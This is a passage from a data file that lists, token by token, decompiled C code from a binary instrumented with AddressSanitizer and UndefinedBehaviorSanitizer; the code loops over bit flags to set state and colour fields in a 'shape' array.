            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "shape",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_234C40",
            ",",
            "v7",
            ")",
            ";",
            "v8",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v7",
            "[",
            "j",
            "]",
            ".",
            "c",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "v9",
            "=",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "shape",
            "+",
            "16",
            "*",
            "j",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v8",
            "&",
            "&",
            "v8",
            "!",
            "=",
            "0",
            ";",
            "v10",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v7",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "b",
            "+",
            "3",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v9",
            "|",
            "|",
            "v10",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "shape",
            "+",
            "16",
            "*",
            "j",
            "+",
            "15",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v10",
            ")",
            "__asan_report_store_n",
            "(",
            "&",
            "v7",
            "[",
            "j",
            "]",
            ".",
            "c",
            ",",
            "12L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "char",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "352",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "0",
            "|",
            "|",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "363",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "v1",
            "+",
            "107",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "363",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load_n",
            "(",
            "v1",
            "+",
            "352",
            ",",
            "12L",
            "L",
            ")",
            ";",
            "}",
            "v11",
            "=",
            "&",
            "v7",
            "[",
            "j",
            "]",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "v11",
            "-",
            ">",
            "c",
            ".",
            "r",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "352",
            ")",
            ";",
            "v11",
            "-",
            ">",
            "c",
            ".",
            "b",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "360",
            ")",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "j",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_2350A0",
            ",",
            "j",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "for",
            "(",
            "ja",
            "=",
            "0",
            ";",
            "ja",
            "<",
            "=",
            "3",
            ";",
            "+",
            "+",
            "ja",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "ja",
            ">",
            "0x1F",
            "|",
            "|",
            "1u",
            ">",
            ">",
            "(",
            "31",
            "-",
            "ja",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_shift_out_of_bounds",
            "(",
            "&",
            "off_234AA0",
            ",",
            "1L",
            "L",
            ",",
            "ja",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "160",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "160",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v1",
            "+",
            "160",
            ")",
            ";",
            "v39",
            "=",
            "(",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "160",
            ")",
            ">",
            ">",
            "ja",
            ")",
            "&",
            "1",
            ")",
            "!",
            "=",
            "0",
            ";",
            "v12",
            "=",
            "(",
            "*",
            "shape",
            ")",
            "[",
            "4",
            "*",
            "(",
            "__int64",
            ")",
            "i",
            "]",
            ";",
            "v13",
            "=",
            "3",
            "-",
            "ja",
            ";",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "3",
            ",",
            "ja",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_2350E0",
            ",",
            "3L",
            "L",
            ",",
            "ja",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v13",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_234CA0",
            ",",
            "v13",
            ")",
            ";",
            "v40",
            "=",
            "v39",
            ";",
            "if",
            "(",
            "!",
            "v12",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "shape",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_234CE0",
            ",",
            "v12",
            ")",
            ";",
            "v14",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v12",
            "[",
            "v13",
            "+",
            "4",
            "]",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v14",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "shape",
            "+",
            "16",
            "*",
            "(",
            "v13",
            "+",
            "4",
            ")",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v14",
            ")",
            "__asan_report_store1",
            "(",
            "&",
            "v12",
            "[",
            "v13",
            "+",
            "4",
            "]",
            ")",
            ";",
            "v12",
            "[",
            "v13",
            "+",
            "4",
            "]",
            ".",
            "state",
            "=",
            "v40",
            ";",
            "v15",
            "=",
            "(",
            "*",
            "shape",
            ")",
            "[",
            "4",
            "*",
            "(",
            "__int64",
            ")",
            "i",
            "]",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "ja",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_234D40",
            ",",
            "ja",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v15",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "shape",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_234D80",
            ",",
            "v15",
            ")",
            ";",
            "v16",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v15",
            "[",
            "ja",
            "+",
            "4",
            "]",
            ".",
            "c",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "v17",
            "=",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "shape",
            "+",
            "16",
            "*",
            "(",
            "ja",
            "+",
            "4",
            ")",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v16",
            "&",
            "&",
            "v16",
            "!",
            "=",
            "0",
            ";",
            "v18",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v15",
            "[",
            "ja",
            "+",
            "4",
            "]",
            ".",
            "c",
            ".",
            "b",
            "+",
            "3",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v17",
            "|",
            "|",
            "v18",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "shape",
            "+",
            "16",
            "*",
            "(",
            "ja",
            "+",
            "4",
            ")",
            "+",
            "15",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v18",
            ")",
            "__asan_report_store_n",
            "(",
            "&",
            "v15",
            "[",
            "ja",
            "+",
            "4",
            "]",
            ".",
            "c",
            ",",
            "12L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "char",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "352",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "0",
            "|",
            "|",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "363",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "v1",
            "+",
            "107",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "363",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load_n",
            "(",
            "v1",
            "+",
            "352",
            ",",
            "12L",
            "L",
            ")",
            ";",
            "}",
            "v19",
            "=",
            "&",
            "v15",
            "[",
            "ja",
            "+",
            "4",
            "]",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "v19",
            "-",
            ">",
            "c",
            ".",
            "r",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "352",
            ")",
            ";",
            "v19",
            "-",
            ">",
            "c",
            ".",
            "b",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "360",
            ")",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "ja",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_235120",
            ",",
            "ja",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "for",
            "(",
            "jb",
            "=",
            "0",
            ";",
            "jb",
            "<",
            "=",
            "3",
            ";",
            "+",
            "+",
            "jb",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "jb",
            ">",
            "0x1F",
            "|",
            "|",
            "1u",
            ">",
            ">",
            "(",
            "31",
            "-",
            "jb",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_shift_out_of_bounds",
            "(",
            "&",
            "off_234AE0",
            ",",
            "1L",
            "L",
            ",",
            "jb",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "224",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "224",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v1",
            "+",
            "224",
            ")",
            ";",
            "v41",
            "=",
            "(",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "224",
            ")",
            ">",
            ">",
            "jb",
            ")",
            "&",
            "1",
            ")",
            "!",
            "=",
            "0",
            ";",
            "v20",
            "=",
            "(",
            "*",
            "shape",
            ")",
            "[",
            "4",
            "*",
            "(",
            "__int64",
            ")",
            "i",
            "]",
            ";",
            "v21",
            "=",
            "3",
            "-",
            "jb",
            ";",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "3",
            ",",
            "jb",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_235160",
            ",",
            "3L",
            "L",
            ",",
            "jb",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v21",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_234DE0",
            ",",
            "v21",
            ")",
            ";",
            "v42",
            "=",
            "v41",
            ";",
            "if",
            "(",
            "!",
            "v20",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "shape",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_234E20",
            ",",
            "v20",
            ")",
            ";",
            "v22",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v20",
            "[",
            "v21",
            "+",
            "8",
            "]",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v22",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "shape",
            "+",
            "16",
            "*",
            "(",
            "v21",
            "+",
            "8",
            ")",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v22",
            ")",
            "__asan_report_store1",
            "(",
            "&",
            "v20",
            "[",
            "v21",
            "+",
            "8",
            "]",
            ")",
            ";",
            "v20",
            "[",
            "v21",
            "+",
            "8",
            "]",
            ".",
            "state",
            "=",
            "v42",
            ";",
            "v23",
            "=",
            "(",
            "*",
            "shape",
            ")",
            "[",
            "4",
            "*",
            "(",
            "__int64",
            ")",
            "i",
            "]",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "jb",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_234E80",
            ",",
            "jb",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v23",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "shape",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_234EC0",
            ",",
            "v23",
            ")",
            ";",
            "v24",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v23",
            "[",
            "jb",
            "+",
            "8",
            "]",
            ".",
            "c",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "v25",
            "=",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "shape",
            "+",
            "16",
            "*",
            "(",
            "jb",
            "+",
            "8",
            ")",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v24",
            "&",
            "&",
            "v24",
            "!",
            "=",
            "0",
            ";",
            "v26",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v23",
            "[",
            "jb",
            "+",
            "8",
            "]",
            ".",
            "c",
            ".",
            "b",
            "+",
            "3",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v25",
            "|",
            "|",
            "v26",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "shape",
            "+",
            "16",
            "*",
            "(",
            "jb",
            "+",
            "8",
            ")",
            "+",
            "15",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v26",
            ")",
            "__asan_report_store_n",
            "(",
            "&",
            "v23",
            "[",
            "jb",
            "+",
            "8",
            "]",
            ".",
            "c",
            ",",
            "12L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "char",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "352",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "0",
            "|",
            "|",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "363",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "v1",
            "+",
            "107",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "363",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load_n",
            "(",
            "v1",
            "+",
            "352",
            ",",
            "12L",
            "L",
            ")",
            ";",
            "}",
            "v27",
            "=",
            "&",
            "v23",
            "[",
            "jb",
            "+",
            "8",
            "]",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "v27",
            "-",
            ">",
            "c",
            ".",
            "r",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "352",
            ")",
            ";",
            "v27",
            "-",
            ">",
            "c",
            ".",
            "b",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "360",
            ")",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "jb",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_2351A0",
            ",",
            "jb",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "for",
            "(",
            "jc",
            "=",
            "0",
            ";",
            "jc",
            "<",
            "=",
            "3",
            ";",
            "+",
            "+",
            "jc",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "jc",
            ">",
            "0x1F",
            "|",
            "|",
            "1u",
            ">",
            ">",
            "(",
            "31",
            "-",
            "jc",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_shift_out_of_bounds",
            "(",
            "&",
            "off_234B20",
            ",",
            "1L",
            "L",
            ",",
            "jc",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "288",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "288",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v1",
            "+",
            "288",
            ")",
            ";",
            "v43",
            "=",
            "(",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "288",
            ")",
            ">",
            ">",
            "jc",
            ")",
            "&",
            "1",
            ")",
            "!",
            "=",
            "0",
            ";",
            "v28",
            "=",
            "(",
            "*",
            "shape",
            ")",
            "[",
            "4",
            "*",
            "(",
            "__int64",
            ")",
            "i",
            "]",
            ";",
            "v29",
            "=",
            "3",
            "-",
            "jc",
            ";",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "3",
            ",",
            "jc",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_2351E0",
            ",",
            "3L",
            "L",
            ",",
            "jc",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v29",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_234F20",
            ",",
            "v29",
            ")",
            ";",
            "v44",
            "=",
            "v43",
            ";",
            "if",
            "(",
            "!",
            "v28",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "shape",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_234F60",
            ",",
            "v28",
            ")",
            ";",
            "v30",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v28",
            "[",
            "v29",
            "+",
            "12",
            "]",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v30",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "shape",
            "+",
            "16",
            "*",
            "(",
            "v29",
            "+",
            "12",
            ")",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v30",
            ")",
            "__asan_report_store1",
            "(",
            "&",
            "v28",
            "[",
            "v29",
            "+",
            "12",
            "]",
            ")",
            ";",
            "v28",
            "[",
            "v29",
            "+",
            "12",
            "]",
            ".",
            "state",
            "=",
            "v44",
            ";",
            "v31",
            "=",
            "(",
            "*",
            "shape",
            ")",
            "[",
            "4",
            "*",
            "(",
            "__int64",
            ")",
            "i",
            "]",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "jc",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_234FC0",
            ",",
            "jc",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v31",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "shape",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_235000",
            ",",
            "v31",
            ")",
            ";",
            "v32",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v31",
            "[",
            "jc",
            "+",
            "12",
            "]",
            ".",
            "c",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "v33",
            "=",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "shape",
            "+",
            "16",
            "*",
            "(",
            "jc",
            "+",
            "12",
            ")",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v32",
            "&",
            "&",
            "v32",
            "!",
            "=",
            "0",
            ";",
            "v34",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v31",
            "[",
            "jc",
            "+",
            "12",
            "]",
            ".",
            "c",
            ".",
            "b",
            "+",
            "3",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v33",
            "|",
            "|",
            "v34",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "shape",
            "+",
            "16",
            "*",
            "(",
            "jc",
            "+",
            "12",
            ")",
            "+",
            "15",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v34",
            ")",
            "__asan_report_store_n",
            "(",
            "&",
            "v31",
            "[",
            "jc",
            "+",
            "12",
            "]",
            ".",
            "c",
            ",",
            "12L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "char",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "352",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "0",
            "|",
            "|",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "363",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "v1",
            "+",
            "107",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "363",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load_n",
            "(",
            "v1",
            "+",
            "352",
            ",",
            "12L",
            "L",
            ")",
            ";",
            "}",
            "v35",
            "=",
            "&",
            "v31",
            "[",
            "jc",
            "+",
            "12",
            "]",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "v35",
            "-",
            ">",
            "c",
            ".",
            "r",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "352",
            ")",
            ";",
            "v35",
            "-",
            ">",
            "c",
            ".",
            "b",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "360",
            ")",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "jc",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_235220",
            ",",
            "jc",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "i",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_235260",
            ",",
            "i",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "result",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "v52",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v1",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8010",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8018",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8020",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8028",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v1",
            "=",
            "1172321806L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8010",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8018",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8020",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8028",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "}",
            "return",
            "result",
